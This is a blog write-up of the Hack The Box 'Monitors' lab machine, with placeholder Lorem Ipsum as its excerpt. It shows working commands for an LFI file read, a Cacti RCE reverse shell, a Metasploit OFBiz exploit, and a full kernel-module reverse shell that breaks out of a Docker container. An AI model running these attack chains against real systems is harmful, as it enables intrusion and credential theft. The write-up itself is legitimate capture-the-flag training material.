---
layout: single
title: Monitors - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-05-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-monitors/monitors_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-monitors/monitors_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/monitors]# nmap -Pn -n -sCV --open 10.10.10.238                                                                    (master✱)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
  |   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
  |_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


DIRB:
  ---- Scanning URL: http://monitors.htb/ ----
    + http://monitors.htb/index.php (CODE:301|SIZE:0)
    + http://monitors.htb/server-status (CODE:403|SIZE:277)
    ==> DIRECTORY: http://monitors.htb/wp-admin/
    ==> DIRECTORY: http://monitors.htb/wp-content/
    ==> DIRECTORY: http://monitors.htb/wp-includes/
    + http://monitors.htb/xmlrpc.php (CODE:405|SIZE:42)

  ---- Entering directory: http://monitors.htb/wp-admin/ ----
    + http://monitors.htb/wp-admin/admin.php (CODE:302|SIZE:0)
    ==> DIRECTORY: http://monitors.htb/wp-admin/css/
    ==> DIRECTORY: http://monitors.htb/wp-admin/images/
    ==> DIRECTORY: http://monitors.htb/wp-admin/includes/
    + http://monitors.htb/wp-admin/index.php (CODE:302|SIZE:0)
    ==> DIRECTORY: http://monitors.htb/wp-admin/js/
    ==> DIRECTORY: http://monitors.htb/wp-admin/maint/
    ==> DIRECTORY: http://monitors.htb/wp-admin/network/
    ==> DIRECTORY: http://monitors.htb/wp-admin/user/

  ---- Entering directory: http://monitors.htb/wp-content/ ----
    + http://monitors.htb/wp-content/index.php (CODE:200|SIZE:0)
    ==> DIRECTORY: http://monitors.htb/wp-content/languages/
    ==> DIRECTORY: http://monitors.htb/wp-content/plugins/
    ==> DIRECTORY: http://monitors.htb/wp-content/themes/
    ==> DIRECTORY: http://monitors.htb/wp-content/upgrade/
    ==> DIRECTORY: http://monitors.htb/wp-content/uploads/

NIKTO:
  + Apache/2.4.29

http://10.10.10.238:
  + 'If you are having issues accessing the site then contact the website administrator: admin@monitors.htb'

http://monitors.htb
  + written by admin
  + Powered by Wordpress
  + Searchbox - check for input validation?

WPSCAN:
  [+] XML-RPC seems to be enabled: http://monitors.htb/xmlrpc.php
   | Found By: Link Tag (Passive Detection)
   | Confidence: 100%
   | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
   | References:
   |  - http://codex.wordpress.org/XML-RPC_Pingback_API
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
   |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
   |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

  [+] Upload directory has listing enabled: http://monitors.htb/wp-content/uploads/

  [+] The external WP-Cron seems to be enabled: http://monitors.htb/wp-cron.php
   | Found By: Direct Access (Aggressive Detection)
   | References:
   |  - https://www.iplocation.net/defend-wordpress-from-ddos
   |  - https://github.com/wpscanteam/wpscan/issues/1299

  [+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).

  [+] WordPress theme in use: iconic-one
   | Location: http://monitors.htb/wp-content/themes/iconic-one/
   | Last Updated: 2020-12-24T00:00:00.000Z
   | Readme: http://monitors.htb/wp-content/themes/iconic-one/readme.txt
   | [!] The version is out of date, the latest version is 2.1.9
   | Style URL: http://monitors.htb/wp-content/themes/iconic-one/style.css?ver=1.7.8
   | Style Name: Iconic One
   | Style URI: https://themonic.com/iconic-one/
   | Description: Iconic One is a premium quality theme with pixel perfect typography and responsiveness and is built ...
   | Author: Themonic
   | Author URI: https://themonic.com
   |
   | Found By: Css Style In Homepage (Passive Detection)
   |
   | Version: 2.1.7 (80% confidence)
   | Found By: Style (Passive Detection)
   |  - http://monitors.htb/wp-content/themes/iconic-one/style.css?ver=1.7.8, Match: 'Version: 2.1.7'

   [+] wp-with-spritz
    | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
    | Latest Version: 1.0 (up to date)
    | Last Updated: 2015-08-20T20:15:00.000Z
    |
    | Found By: Urls In Homepage (Passive Detection)
    |
    | Version: 4.2.4 (80% confidence)
    | Found By: Readme - Stable Tag (Aggressive Detection)
    |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt

WORDPRESS ADMIN LOGIN: http://monitors.htb/wp-login.php

2. Googling on the plugin, wp spritz, there seem to be a LFI vulnerability. Download the python script and start enumerating the
inside of the box. (Or simply use cURL)

[root:/git/htb/monitors]# curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=../../../../../../etc/passwd
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
  systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
  syslog:x:102:106::/home/syslog:/usr/sbin/nologin
  messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
  _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
  lxd:x:105:65534::/var/lib/lxd/:/bin/false
  uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
  dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
  landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
  sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
  marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
  Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
  mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false

Internal username is marcus.

The WordPress password storage for the login passwords is fairly secure. The passwords are encrypted and stored in the WordPress
MySQL database. However, the password for the WordPress MySQL database itself is stored in the wp-config.php file in plain text.

[root:/git/htb/monitors]# curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=../../../wp-config.php
  ..
  define( 'DB_NAME', 'wordpress' );

  /** MySQL database username */
  define( 'DB_USER', 'wpadmin' );

  /** MySQL database password */
  define( 'DB_PASSWORD', 'BestAdministrator@2020!' );

  /**#@+
   * Authentication Unique Keys and Salts.
   *
   * Change these to different unique phrases!
   * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
   * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
   *
   * @since 2.6.0
   */
  define( 'AUTH_KEY',         'KkY%W@>T}4CKTw5{.n_j3bywoB0k^|OKX0{}5|UqZ2!VH!^uWKJ.O oROc,h pp:' );
  define( 'SECURE_AUTH_KEY',  '*MHA-~<-,*^$raDR&uxP)k(~`k/{PRT(6JliOO9XnYYbFU?Xmb#9USEjmgeHYYpm' );
  define( 'LOGGED_IN_KEY',    ')F6L,A23Tbr9yhrhbgjDHJPJe?sCsDzDow-$E?zYCZ3*f40LSCIb] E%zrW@bs3/' );
  define( 'NONCE_KEY',        'g?vl(p${jG`JvDxVw-]#oUyd+uvFRO1tAUZQG_sGg&Q7O-*tF[KIe$weE^$bB3%C' );
  define( 'AUTH_SALT',        '8>PIil3 7re_:3&@^8Zh|p^I8rwT}WpVr5|t^ih05A:]xjTA,UVXa8ny:b--/[Jk' );
  define( 'SECURE_AUTH_SALT', 'dN c^]m:4O|GyOK50hQ1tumg4<JYlD2-,r,oq7GDjq4M Ri:x]Bod5L.S&.hEGfv' );
  define( 'LOGGED_IN_SALT',   'tCWVbTcE*_T_}X3#t+:)>N+D%?vVAIw#!*&OK78M[@ YT0q):G~A:hTv`bO<,|68' );
  define( 'NONCE_SALT',       'sa>i39)9<vVyhE3auBVzl%=p23NJbl&)*.{`<*>;R2=QHqj_a.%({D4yI-sy]D8,' );

  /**#@-*/

We have database creds (wpadmin:BestAdministrator@2020!) and keys+salts used for hashing the passwords. The password is not reused
on either wp-admin nor SSH.

After unsuccessfully testing out different RFI payloads for a while I had a look in '/etc/php/7.2/apache2/php.ini' and noticed
that 'allow_url_fopen = On' but 'allow_url_include = Off' - making RFI impossible.

Download HackTrick's LFI-list, and do a Hail Marry with Burp Intruder, sort by Length and we come across:

/etc/apache2/sites-enabled/000-default.conf
  # Default virtual host settings
  # Add monitors.htb.conf
  # Add cacti-admin.monitors.htb.conf

A new vhost! Add it to /etc/hosts.


3. On http://cacti-admin.monitors.htb we are presented with a login prompt, testing the creds admin:BestAdministrator@2020!
give us successful login. We see that it's running Cacti version 1.2.12.

Googling for Cacti 1.2.12 exploits we find a python RCE. Downloading it and execute gives us a reverse shell!

  [root:/git/htb/monitors]# python3 cacti-rce.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.12 --lport 4488
    [+] Connecting to the server...
    [+] Retrieving CSRF token...
    [+] Got CSRF token: sid:97352a3ee6f8c68e07088e88d2e75ed5df8bc588,1620638867
    [+] Trying to log in...
    [+] Successfully logged in!

    [+] SQL Injection:
    "name","hex"
    "",""
    "admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
    "guest","43e9a4ab75570f5b"

    [+] Check your nc listener!

  [root:/git/htb/monitors]# nc -lvnp 4488                                                                                           (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.12] from (UNKNOWN) [10.10.10.238] 38356
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

Upgrade the shell;
  www-data@monitors:/usr/share/cacti/cacti$


4. We can try to dump the mysql database for WordPress, in order to crack the admin password.

  www-data@monitors:/usr/share/cacti/cacti$ mysqldump wordpress wp_users -u wpadmin -p
    Enter password: BestAdministrator@2020!
    ..
    LOCK TABLES `wp_users` WRITE;
    /*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
    INSERT INTO `wp_users` VALUES (1,'admin','$P$Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0','admin','admin@monitor.htb','http://192.168.1.40','2020-10-15 13:45:42','1620579357:$P$BPWRkUQGNxbjdPxyenG7IVioT6ri7t.',0,'admin');

  [root:/git/htb/monitors]# hashcat -a0 -m400 admin.hash /usr/share/wordlists/rockyou.txt
    ..
    Session..........: hashcat
    Status...........: Exhausted
    Hash.Name........: phpass
    Hash.Target......: $P$Be7cx.OsLozVI5L6DD60LLZNoHW9dZ0

No luck.. instead go the normal route and upload linpeas.

Listener: www-data@monitors:/dev/shm$ nc -lp 4433 > linpeas.sh
Transfer: [root:/opt/scanners/linux]# nc -w3 10.10.10.238 4433 < linpeas.sh

Running linpeas doesn't give anything of real use however..
Moving on and manually looking in /home/marcus we see the directory .backup, but we lack privs to see what's in it.

  www-data@monitors:/home/marcus$ ls -al
    total 40
    drwxr-xr-x 5 marcus marcus 4096 Jan 25 15:39 .
    drwxr-xr-x 3 root   root   4096 Nov 10 17:00 ..
    d--x--x--x 2 marcus marcus 4096 Nov 10 18:21 .backup
    lrwxrwxrwx 1 root   root      9 Nov 10 18:30 .bash_history -> /dev/null
    -rw-r--r-- 1 marcus marcus  220 Apr  4  2018 .bash_logout
    -rw-r--r-- 1 marcus marcus 3771 Apr  4  2018 .bashrc
    drwx------ 2 marcus marcus 4096 Jan 25 15:39 .cache
    drwx------ 3 marcus marcus 4096 Nov 10 17:00 .gnupg
    -rw-r--r-- 1 marcus marcus  807 Apr  4  2018 .profile
    -r--r----- 1 root   marcus   84 Jan 25 14:59 note.txt
    -r--r----- 1 root   marcus   33 May  9 15:30 user.txt

We can search the entire system to see if there are any file or service that have an absolute path to '/home/marcus/.backup'
NOTE: This is very unoptimized and will take several minutes.

  www-data@monitors:/$ grep -Ril "/home/marcus/.backup" 2> /dev/null
    /etc/systemd/system/cacti-backup.service

  www-data@monitors:/$ cat /etc/systemd/system/cacti-backup.service
    [Unit]
    Description=Cacti Backup Service
    After=network.target

    [Service]
    Type=oneshot
    User=www-data
    ExecStart=/home/marcus/.backup/backup.sh

    [Install]
    WantedBy=multi-user.target

Lets try if we can read the file backup.sh:
  www-data@monitors:/$ cat /home/marcus/.backup/backup.sh
    #!/bin/bash

    backup_name="cacti_backup"
    config_pass="VerticalEdge2020"

    zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
    sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
    rm /tmp/${backup_name}.zip

A new set of creds! cacti_backup:VerticalEdge2020 - lets try if user marcus use the same password.

  www-data@monitors:/$ su marcus
    Password: VerticalEdge2020
    marcus@monitors:/$ id
      uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
    marcus@monitors:/$ cat /home/marcus/user.txt
      20914feda0c2c461a15461b4a650c321


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. We saw earlier note.txt in marcus home directory, lets check it out!

  marcus@monitors:~$ cat note.txt
    TODO:

    Disable phpinfo	in php.ini		- DONE
    Update docker image for production use	-

Okay, so the way to root is probably related to the docker image, where ever that is.
Run linpeas to see if there are any local services running.

  ================================( Processes, Cron, Services, Timers & Sockets )================================
  [+] Cleaned processes
  ..
  root       1597  0.0  1.9 975760 76932 ?        Ssl  May09   0:12 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
  root       2096  0.0  0.1 627100  5328 ?        Sl   May09   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443
  root       2112  0.0  0.1 108820  4756 ?        Sl   May09   0:02 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/b19c764b5ef0d32990e4695ff1f63de830ff77d3a4873daaa411007fb700d8f0 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
  root       2141  0.0  2.0 3410072 80992 ?       Ssl  May09   1:02 /usr/local/openjdk-8/bin/java -Dorg.gradle.appname=gradlew -classpath /usr/src/apache-ofbiz-17.12.01/gradle/wrapper/gradle-wrapper.jar org.gradle.wrapper.GradleWrapperMain --offline ofbiz
  ..
  [+] Active Ports
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
  Active Internet connections (servers and established)
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
  ..
  tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -


2. Port 8443 is running locally, setup a SSH tunnel to enumerate the service.

[root:/git/htb/monitors]# ssh -L 8443:127.0.0.1:8443 marcus@monitors.htb
[root:/opt/scanners/linux]# lsof -i -P -n | grep LISTEN
  ..
  ssh       36606     root    4u  IPv6 322213      0t0  TCP [::1]:8443 (LISTEN)
  ssh       36606     root    5u  IPv4 322214      0t0  TCP 127.0.0.1:8443 (LISTEN)

Browsing to https://127.0.0.1:8443 we get a 404 - Not Found. Run a fuzzer (ffuf) to see if we can find a entry point.

[root:/opt/scanners/linux]# ffuf -c -w /usr/share/wordlists/dirb/common.txt -u https://127.0.0.1:8443/FUZZ
  accounting              [Status: 302, Size: 0, Words: 1, Lines: 1]
  ap                      [Status: 302, Size: 0, Words: 1, Lines: 1]
  ar                      [Status: 302, Size: 0, Words: 1, Lines: 1]
  catalog                 [Status: 302, Size: 0, Words: 1, Lines: 1]
  common                  [Status: 302, Size: 0, Words: 1, Lines: 1]
  content                 [Status: 302, Size: 0, Words: 1, Lines: 1]
  ebay                    [Status: 302, Size: 0, Words: 1, Lines: 1]
  ecommerce               [Status: 302, Size: 0, Words: 1, Lines: 1]
  example                 [Status: 302, Size: 0, Words: 1, Lines: 1]
  images                  [Status: 302, Size: 0, Words: 1, Lines: 1]
  marketing               [Status: 302, Size: 0, Words: 1, Lines: 1]
  passport                [Status: 302, Size: 0, Words: 1, Lines: 1]

Trying https://127.0.0.1:8443/accounting forwards us to a login prompt for OFBiz release 17.12.01.
Googling about OFBiz 17.12.01 we find that there are a deserialization vuln leading to RCE (CVE-2020-9496), and there's even
a metasploit module for it.

  [root:/git/htb/monitors]# msfdb run
    msf6 > use exploit/linux/http/apache_ofbiz_deserialization
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set rhosts 127.0.0.1
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set lhost 10.10.14.12
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set forceexploit true
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > set payload linux/x64/shell/reverse_tcp   (original meterpreter is slow)
    msf6 exploit(linux/http/apache_ofbiz_deserialization) > run
    ..
    [*] Command shell session 2 opened (10.10.14.12:8443 -> 10.10.10.238:56372) at 2021-05-10 16:16:18 +0200
    [*] Server stopped.

    id
      uid=0(root) gid=0(root) groups=0(root)
    hostname
      b19c764b5ef0
    python -c 'import pty;pty.spawn("/bin/bash")'
    root@b19c764b5ef0:/usr/src/apache-ofbiz-17.12.01#
    root@b19c764b5ef0:/usr/src/apache-ofbiz-17.12.01# ip a
      5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
          link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
          inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
             valid_lft forever preferred_lft forever


3. We're now connected to the container host (172.17.0.2). I would assume that the task here is to break out of the docker container
in order to get root.txt. After some googling I found a blogpost from pentesteracademy.com where they take a step by step tutorial
for breaking out by abusing SYS_MODULE.

Start by checking the capabilities provided to the docker container:

  root@b19c764b5ef0:/usr/src/apache-ofbiz-17.12.01# capsh --print
    Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
    Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
    Securebits: 00/0x0/1'b0
     secure-noroot: no (unlocked)
     secure-no-suid-fixup: no (unlocked)
     secure-keep-caps: no (unlocked)
    uid=0(root)
    gid=0(root)
    groups=

We see that our docker has 'cap_sys_module', as a result the container can insert/remove kernel modules in/from the kernel of
the docker host machine - aka monitors.htb.

Follow the steps to create a reverse shell using usermode Helper API.
NOTE: Change IP to 172.17.0.1 (docker0 interface of monitors.htb) and port to whatever you like.

  root@8b08538ad9e7:/tmp# cat reverse-shell.c
    #include <linux/kmod.h>
    #include <linux/module.h>
    MODULE_LICENSE("GPL");
    MODULE_AUTHOR("AttackDefense");
    MODULE_DESCRIPTION("LKM reverse shell module");
    MODULE_VERSION("1.0");
    char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.17.0.1/4488 0>&1", NULL};
    static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    static int __init reverse_shell_init(void) {
    	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    }
    static void __exit reverse_shell_exit(void) {
    	printk(KERN_INFO "Exiting\n");
    }
    module_init(reverse_shell_init);
    module_exit(reverse_shell_exit);

Create the Makefile;
  root@8b08538ad9e7:/tmp# cat Makefile
    obj-m +=reverse-shell.o
    all:
    		make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
    clean:
    		make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

Next we make the kernel module;
  root@8b08538ad9e7:/tmp/rev# make
    make -C /lib/modules/4.15.0-142-generic/build M=/tmp/rev modules
    make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
      CC [M]  /tmp/rev/reverse-shell.o
    gcc: error trying to exec 'cc1': execvp: No such file or directory
    make[2]: *** [scripts/Makefile.build:339: /tmp/rev/reverse-shell.o] Error 1
    make[1]: *** [Makefile:1584: _module_/tmp/rev] Error 2
    make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'
    make: *** [Makefile:3: all] Error 2

gcc cc1 was not found, and unfortunatley we are unable to fix this using 'apt-get install --reinstall build-essential'. We can't
compile on any other host, as other headers would be used - /usr/src/linux-headers-5.10.0-kali4-amd64 on Kali for example, while
the docker wants /usr/src/linux-headers-4.15.0-142-generic.

Maybe it's a formatting error, lets try to create the files on our local Kali host, and then transfer them to the remote container.

  [root:/git/htb/monitors/rev]# python3 -m http.server 80
  root@8b08538ad9e7:/rev# wget http://10.10.14.12/Makefile
  root@8b08538ad9e7:/rev# wget http://10.10.14.12/reverse-shell.c

  root@8b08538ad9e7:/rev# make
    make -C /lib/modules/4.15.0-142-generic/build M=/rev modules
    make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
      CC [M]  /rev/reverse-shell.o
    gcc: error trying to exec 'cc1': execvp: No such file or directory
    make[2]: *** [scripts/Makefile.build:339: /rev/reverse-shell.o] Error 1
    make[1]: *** [Makefile:1584: _module_/rev] Error 2
    make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'
    make: *** [Makefile:3: all] Error 2

Still the same error.. reading about this issue it seems to be an error related to $PATH.

  root@8b08538ad9e7:/rev# $PATH
    bash: /usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:

GCC is also located in /usr/lib, which is not a part of $PATH - lets add it and try to make again.
  root@8b08538ad9e7:/rev# export PATH=$PATH:/usr/lib
  root@8b08538ad9e7:/rev# make
    make -C /lib/modules/4.15.0-142-generic/build M=/rev modules
    make[1]: Entering directory '/usr/src/linux-headers-4.15.0-142-generic'
      CC [M]  /rev/reverse-shell.o
      Building modules, stage 2.
      MODPOST 1 modules
      CC      /rev/reverse-shell.mod.o
      LD [M]  /rev/reverse-shell.ko
    make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-142-generic'


4. We successfully compiled our reverse-shell! Setup a listener on the victim machine and trigger the reverse to grab root.txt.

  root@8b08538ad9e7:/rev# insmod reverse-shell.ko

  marcus@monitors:/tmp$ nc -lvnp 4488
    Listening on [0.0.0.0] (family 0, port 4488)
    Connection from 10.10.10.238 60668 received!
    bash: cannot set terminal process group (-1): Inappropriate ioctl for device
    bash: no job control in this shell
    root@monitors:/# id
      uid=0(root) gid=0(root) groups=0(root)
    root@monitors:/# cat /root/root.txt
      07f715aa4df670c67174826151f2c30c

    root@monitors:/root/.ssh# cat /etc/shadow
      root:$6$vSJnzptH$pCoAuyngEc2pUm3Hos6qTNzopXdvnXACaAZEDAQU4VoBc19qxa9eASxv/EKnkTEOWWGyuPobtS/QA2kAFkrWP0:18577:0:99999:7:::


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


WP Spritz RFI:
  https://github.com/mekhalleh/rfi-wp_sprit

WordPress Salts and Security Keys:
  https://www.wpexplorer.com/wordpress-salts-security-keys/

HackTrick.xyz LFI List:
  https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list

Cacti SQLi / RCE:
  https://www.exploit-db.com/exploits/49810

Ofbiz RCE:
  https://www.zerodayinitiative.com/blog/2020/9/14/cve-2020-9496-rce-in-apache-ofbiz-xmlrpc-via-deserialization-of-untrusted-data

Docker Container Breakout, Abusing SYS_MODULE:
  https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd

GCC cc1 Error:
  https://stackoverflow.com/questions/30344106/gcc-error-trying-to-exec-cc1-execvp-no-such-file-or-directory-when-running-w
